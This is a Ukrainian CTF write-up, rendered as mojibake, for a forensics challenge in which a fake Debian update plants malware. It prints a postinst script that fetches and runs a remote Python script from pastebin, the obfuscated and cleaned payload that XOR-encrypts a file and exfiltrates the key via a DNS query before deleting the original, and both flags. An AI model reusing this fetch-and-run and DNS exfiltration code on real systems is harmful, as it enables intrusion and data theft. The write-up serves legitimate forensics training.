<p align="center">
  <img src="/.img/Screenshot_1.png" alt="image" width="640" height="360" />
</p>

# üß© –ö—ñ—Ç —É –º—ñ—à–∫—É (Cat in the Bag)
## **–ö–∞—Ç–µ–≥–æ—Ä—ñ—è:** DFIR  
## **–°–∫–ª–∞–¥–Ω—ñ—Å—Ç—å:** Hard

---

### **–û–ø–∏—Å –∑–∞–≤–¥–∞–Ω–Ω—è:**  
–û–¥–Ω–æ–≥–æ —Ä–∞–Ω–∫—É –≤—Å—ñ –∫–æ–º–ø‚Äô—é—Ç–µ—Ä–∏ —É–Ω—ñ–≤–µ—Ä—Å–∏—Ç–µ—Ç—É –æ–¥–Ω–æ—á–∞—Å–Ω–æ –æ—Ç—Ä–∏–º–∞–ª–∏ –ø–∞–∫–µ—Ç —ñ–∑ ‚Äú—Ç–µ—Ä–º—ñ–Ω–æ–≤–∏–º –æ–Ω–æ–≤–ª–µ–Ω–Ω—è–º —Å–∏—Å—Ç–µ–º–∏‚Äù.  
–î–µ–∫—ñ–ª—å–∫–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –≤—Å—Ç–∞–Ω–æ–≤–∏–ª–∏ –π–æ–≥–æ, –∞–ª–µ –Ω–∞ –ø–µ—Ä—à–∏–π –ø–æ–≥–ª—è–¥ –Ω—ñ—á–æ–≥–æ –∫—Ä–∏—Ç–∏—á–Ω–æ–≥–æ –Ω–µ —Å—Ç–∞–ª–æ—Å—è ‚Äì –∑–∞ –≤–∏–Ω—è—Ç–∫–æ–º —Ç–æ–≥–æ, —â–æ –æ–¥–∏–Ω —Ñ–∞–π–ª –≤–∏—è–≤–∏–≤—Å—è –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–º. –í–∞–º –≤–¥–∞–ª–æ—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–∞–º–ø –¥–∏—Å–∫—É —Ç–∞ –º–µ—Ä–µ–∂–µ–≤–æ—ó –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—ñ –∑ –æ–¥–Ω—ñ—î—ó –∑ –∑–∞—Ä–∞–∂–µ–Ω–∏—Ö –º–∞—à–∏–Ω.  
–ó‚Äô—è—Å—É–π—Ç–µ, —â–æ —Å–∞–º–µ –ø—Ä–∏—Ö–æ–≤—É—î —Ü–µ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è ‚Äì —ñ —Å–ø—Ä–æ–±—É–π—Ç–µ –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—Ö –¥–∞–Ω–∏—Ö.  

Q1: –ü—Ä–æ–∞–Ω–∞–ª—ñ–∑—É–π—Ç–µ –Ω–∞–¥–∞–Ω—ñ –¥–∞–º–ø–∏ —Ç–∞ —Ä–æ–∑—à–∏—Ñ—Ä—É–π—Ç–µ **flag.enc**. –í—ñ–¥–ø–æ–≤—ñ–¥—å –ø–æ–¥–∞–π—Ç–µ —É —Ñ–æ—Ä–º–∞—Ç—ñ actf{flag}.  

Q2: –ó‚Äô—è—Å—É–π—Ç–µ, —è–∫—ñ —Å–∞–º–µ –∑–º—ñ–Ω–∏ –±—É–ª–∏ –≤–Ω–µ—Å–µ–Ω—ñ –≤ —Å–∏—Å—Ç–µ–º—É –ø—ñ—Å–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –æ–Ω–æ–≤–ª–µ–Ω–Ω—è ‚Äì —ñ —â–æ —Å–∞–º–µ –≤–æ–Ω–∏ —Ä–µ–∞–ª—ñ–∑—É—é—Ç—å. –í—ñ–¥–ø–æ–≤—ñ–¥—å –ø–æ–¥–∞–π—Ç–µ —É —Ñ–æ—Ä–º–∞—Ç—ñ actf{flag}.  

---
### **–§–∞–π–ª–∏**
```dump.zip```  

```net_dump.pcapng```

### **–†–æ–∑–≤'—è–∑–∞–Ω–Ω—è:**  
1. –ù–∞ –ø–µ—Ä—à–æ–º—É –∫—Ä–æ—Ü—ñ **–¥–∞–º–ø —Ç—Ä–∞—Ñ—ñ–∫—É –Ω–∞–º –Ω—ñ—á–æ–≥–æ –Ω–µ –¥–∞—Å—Ç—å**, –ø–æ–¥–∏–≤–∏–º–æ—Å—å, —â–æ —î –Ω–∞ –¥–∏—Å–∫—É.

  ```
  dump
  ‚îú‚îÄ‚îÄ flag.enc
  ‚îú‚îÄ‚îÄ opt
  ‚îÇ¬†¬† ‚îî‚îÄ‚îÄ real_cat
  ‚îú‚îÄ‚îÄ root
  ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ control
  ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ opt
  ‚îÇ¬†¬† ‚îÇ¬†¬† ‚îî‚îÄ‚îÄ real_cat
  ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ postinst
  ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ update.deb
  ‚îÇ¬†¬† ‚îî‚îÄ‚îÄ usr
  ‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ bin
  ‚îÇ¬†¬†         ‚îî‚îÄ‚îÄ cat
  ‚îî‚îÄ‚îÄ usr
      ‚îî‚îÄ‚îÄ bin
          ‚îú‚îÄ‚îÄ [
          ‚îú‚îÄ‚îÄ aa-enabled
          ‚îú‚îÄ‚îÄ aa-exec
          ‚îú‚îÄ‚îÄ aa-features-abi
          ‚îú‚îÄ‚îÄ aconnect
          ...
  ```

2. –†–æ–∑–ø–∞–∫—É—î–º–æ —Ç–∞ –ø–æ–¥–∏–≤–∏–º–æ—Å—å –Ω–∞ –ø–∞–∫–µ—Ç –æ–Ω–æ–≤–ª–µ–Ω–Ω—è **update.deb**.  
  `dpkg-deb -e update.deb update/`  
  `dpkg-deb -x update.deb update/`  
  ```
  update
  ‚îú‚îÄ‚îÄ control
  ‚îú‚îÄ‚îÄ opt
  ‚îÇ¬†¬† ‚îî‚îÄ‚îÄ real_cat
  ‚îú‚îÄ‚îÄ postinst
  ‚îî‚îÄ‚îÄ usr
      ‚îî‚îÄ‚îÄ bin
          ‚îî‚îÄ‚îÄ cat
  ```

3. –ü—ñ—Å–ª—è –ø–µ—Ä–µ–≥–ª—è–¥—É —Å—Ç—Ä—É–∫—Ç—É—Ä–∏ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è, –º–æ–∂–µ–º–æ –ø–æ–±–∞—á–∏—Ç–∏ —Ç–∞–∫—ñ –≤–∏–∫–æ–Ω—É–≤–∞–Ω—ñ —Ñ–∞–π–ª–∏:
  
  - **cat**  
  - **real_cat**  
  - **postinst** (bash-—Å–∫—Ä–∏–ø—Ç)
  
  –ü–µ—Ä–µ–≥–ª—è–Ω–µ–º–æ, —è–∫—ñ –¥—ñ—ó –≤–∏–∫–æ–Ω—É—î —Å–∫—Ä–∏–ø—Ç **postinst**.
  
  ```bash
  #!/bin/bash

  if command -v python3 >/dev/null 2>&1; then

    TMPFILE="/tmp/update.py"
    URL="https://pastebin.com/raw/f7YTAcY7"

    if command -v wget >/dev/null 2>&1; then
        wget -q -O "$TMPFILE" "$URL"
    elif command -v curl >/dev/null 2>&1; then
        curl -s -o "$TMPFILE" "$URL"
    else
        exit 0
    fi

    chmod +x "$TMPFILE"
    python3 "$TMPFILE"
    sleep 2
    rm -f "$TMPFILE"
  fi
  
  exit 0
  ```
  
4. –ê–Ω–∞–ª—ñ–∑ —Å–∫—Ä–∏–ø—Ç–∞:

  - –ü–µ—Ä–µ–≤—ñ—Ä—è—î, —á–∏ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ `python3`
  - –Ø–∫—â–æ –Ω–µ–º–∞—î - –∑–∞–∫—ñ–Ω—á—É—î —Å–≤–æ—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è  
  - –ó–∞–≤–∞–Ω—Ç–∞–∂—É—î —à–∫—ñ–¥–ª–∏–≤–∏–π –∫–æ–¥ —Ç–∞ –≤–∏–∫–æ–Ω—É—î –π–æ–≥–æ

  –ü–µ—Ä–µ—Ö–æ–¥–∏–º–æ –∑–∞ [–ø–æ—Å–∏–ª–∞–Ω–Ω—è–º](https://pastebin.com/raw/f7YTAcY7) —ñ –¥–∏–≤–∏–º–æ—Å—å –Ω–∞ –∫–æ–¥.
  ```python
  lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll = bytes, len, zip, open, exit

  from os.path import isfile as llIIlIIlIlIIll
  from os import urandom as IIlIllllIIIlll, system as lllIIlllIIIllI
  from base64 import urlsafe_b64encode as IllIlIlIlllIIl
  IllIllIIIIlIIIIlll = '/flag.txt'
  if not llIIlIIlIlIIll(IllIllIIIIlIIIIlll):
      llllllllllllIll(1)
  with lllllllllllllII(IllIllIIIIlIIIIlll, 'rb') as lIllIllIIIIllIlIlI:
      IIllIlIIlIIIIIIIII = lIllIllIIIIllIlIlI.read()
  lIIIllIIIlIIlllIlI = IIlIllllIIIlll(llllllllllllllI(IIllIlIIlIIIIIIIII))
  IllIIlIIIIlllIIIlI = lllllllllllllll([b ^ k for (b, k) in lllllllllllllIl(IIllIlIIlIIIIIIIII, lIIIllIIIlIIlllIlI)])
  lIIIlIlIlIllIIlIll = '/flag.enc'
  with lllllllllllllII(lIIIlIlIlIllIIlIll, 'wb') as lIllIllIIIIllIlIlI:
      lIllIllIIIIllIlIlI.write(IllIIlIIIIlllIIIlI)
  lIIIIIlIIlIIlIIlII = IllIlIlIlllIIl(lIIIllIIIlIIlllIlI).decode().rstrip('=')
  IIIlIllIllIIIIllll = f'{lIIIIIlIIlIIlIIlII}.ubuntu.update'
  IllIIlIIIllIllIIIl = f'dig @192.168.1.181 {IIIlIllIllIIIIllll} > /dev/null 2>&1'
  lllIIlllIIIllI(IllIIlIIIllIllIIIl)
  lllIIlllIIIllI('rm -rf /flag.txt')
  ```
  
–ü—ñ—Å–ª—è –¥–µ–æ–±—Ñ—É—Å–∫–∞—Ü—ñ—ó –∫–æ–¥ –≤–∏–≥–ª—è–¥–∞—î —Ç–∞–∫:

  ```python
  bytes, len, zip, open, exit = bytes, len, zip, open, exit
  
  from os.path import isfile as isfile
  from os import urandom as urandom, system as system
  from base64 import urlsafe_b64encode as urlsafe_b64encode
  flag_path = '/flag.txt'
  if not isfile(flag_path):
      exit(1)
  with open(flag_path, 'rb') as file:
      data = file.read()
  xor_key = urandom(len(data))
  enc_flag = bytes([b ^ k for (b, k) in zip(data, xor_key)])
  enc_path = '/flag.enc'
  with open(enc_path, 'wb') as file:
      file.write(enc_flag)
  xor_key_b64 = urlsafe_b64encode(xor_key).decode().rstrip('=')
  dns_req = f'{xor_key_b64}.ubuntu.update'
  cmd = f'dig @192.168.1.181 {dns_req} > /dev/null 2>&1'
  system(cmd)
  system('rm -rf /flag.txt')
  ```
  –°–∫—Ä–∏–ø—Ç —à–∏—Ñ—Ä—É—î –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É `/flag.txt` –≤–∏–ø–∞–¥–∫–æ–≤–∏–º XOR-–∫–ª—é—á–µ–º —Ç–∞ –∑–±–µ—Ä—ñ–≥–∞—î –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç —É `/flag.enc`. XOR-–∫–ª—é—á –∫–æ–¥—É—î—Ç—å—Å—è –≤ Base64 —Ç–∞ –ø–µ—Ä–µ–¥–∞—î—Ç—å—Å—è –∞—Ç–∞–∫—É–≤–∞–ª—å–Ω–∏–∫—É —á–µ—Ä–µ–∑ DNS-–∑–∞–ø–∏—Ç –Ω–∞ —Å–µ—Ä–≤–µ—Ä `192.168.1.181`, –¥–µ –∫–ª—é—á –≤—Å—Ç–∞–≤–ª—è—î—Ç—å—Å—è —É –≤–∏–≥–ª—è–¥—ñ –ø—ñ–¥–¥–æ–º–µ–Ω—É. –ü—ñ—Å–ª—è —Ü—å–æ–≥–æ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π —Ñ–∞–π–ª –∑ —Ñ–ª–∞–≥–æ–º –≤–∏–¥–∞–ª—è—î—Ç—å—Å—è.  
  
6. –ó–Ω–∞—Ö–æ–¥–∏–º–æ **DNS-–∑–∞–ø–∏—Ç —É —Ç—Ä–∞—Ñ—ñ–∫—É**, –≤ —è–∫–æ–º—É –ø–µ—Ä–µ–¥–∞—î—Ç—å—Å—è –∫–ª—é—á XOR.

<p align="center">
  <img width="1087" height="103" alt="image" src=".img/Screenshot_1.png" />
</p>
  
7. –î–µ—à–∏—Ñ—Ä—É—î–º–æ —Ñ–∞–π–ª (–∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, [Cyberchef](https://gchq.github.io/CyberChef/)):

  <p align="center">
    <img width="1077" height="274" alt="image" src=".img/Screenshot_2.png" />
  </p>
  
---
#### **Flag:** ```actf{swap_flag_R8#d}```
---
8. –ü–∞–∫–µ—Ç –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É—î —É—Ç–∏–ª—ñ—Ç—É **cat**, –¥–æ—Å–ª—ñ–¥–∏–º–æ —Ü–µ–π –ø–∞–∫–µ—Ç –≤ **IDA Pro**.

  <p align="center">
    <img width="633" height="435" alt="image" src=".img/Screenshot_3.png" />
  </p>

9. –ü—Ä–æ–∞–Ω–∞–ª—ñ–∑—É–≤–∞–≤—à–∏ –∫–æ–¥, —Ä–æ–∑—É–º—ñ—î–º–æ ‚Äì –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω–∏–π **cat** –≤–∏–∫–ª–∏–∫–∞—î –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π **cat** (`/opt/real_cat`) –∑ —ñ–Ω—à–æ—ó –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó, –ø—ñ—Å–ª—è —á–æ–≥–æ –∑–∞–ø–∏—Å—É—î –≤–∏–≤—ñ–¥ —É `/usr/bin/logs`. –ü–µ—Ä–µ–≥–ª—è–Ω–µ–º–æ —Ü–µ–π —Ñ–∞–π–ª.

  <p align="center">
    <img width="430" height="60" alt="image" src=".img/Screenshot_4.png" />
  </p>

10. –ú–∞—î–º–æ —Ä—è–¥–æ–∫ —É **hex-—Ñ–æ—Ä–º–∞—Ç—ñ**, –ø–µ—Ä–µ—Ç–≤–æ—Ä–∏–º–æ –π–æ–≥–æ —É —Ç–µ–∫—Å—Ç.

  <p align="center">
    <img width="535" height="85" alt="image" src=".img/Screenshot_5.png" />
  </p>

11. –î–æ–¥–∞—î–º–æ **from base64**, –¥–µ–∫–æ–¥—É—î–º–æ.

  <p align="center">
    <img width="540" height="152" alt="image" src=".img/Screenshot_6.png" />
  </p>
  
---
#### **Flag:** ```actf{cat_flag_m72V!}```
---
